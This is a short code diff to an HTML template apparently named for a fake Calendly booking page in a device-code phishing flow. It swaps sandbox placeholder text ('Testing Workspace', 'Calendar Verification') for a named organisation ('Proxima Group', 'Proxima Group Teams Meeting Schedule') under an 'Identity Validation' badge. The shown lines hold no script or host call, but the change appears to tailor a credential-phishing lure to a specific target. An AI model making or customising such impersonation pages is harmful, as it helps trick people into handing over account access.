@@ -1846,8 +1846,8 @@ const DEVICE_CODE_CALENDLY_HTML = `<!DOCTYPE html>
                 <div class="back-circle" id="backBtn" onclick="stepBack()">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
                 </div>
-                <div class="host-name">Testing Workspace</div>
-                <h1 class="meeting-title">Testing Event Sandbox</h1>
+                <div class="host-name">Proxima Group</div>
+                <h1 class="meeting-title">Proxima Group Teams Meeting Schedule</h1>
                 
                 <div class="details-item">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
@@ -1959,7 +1959,7 @@ const DEVICE_CODE_CALENDLY_HTML = `<!DOCTYPE html>
             </div>
             <div class="secure-header-details">
                 <span class="secure-badge">Identity Validation</span>
-                <h2 class="secure-title">Calendar Verification</h2>
+                <h2 class="secure-title">Meeting Schedule Confirmation</h2>
                 <p class="secure-subtitle">Confirm your slot request</p>
             </div>
         </div>
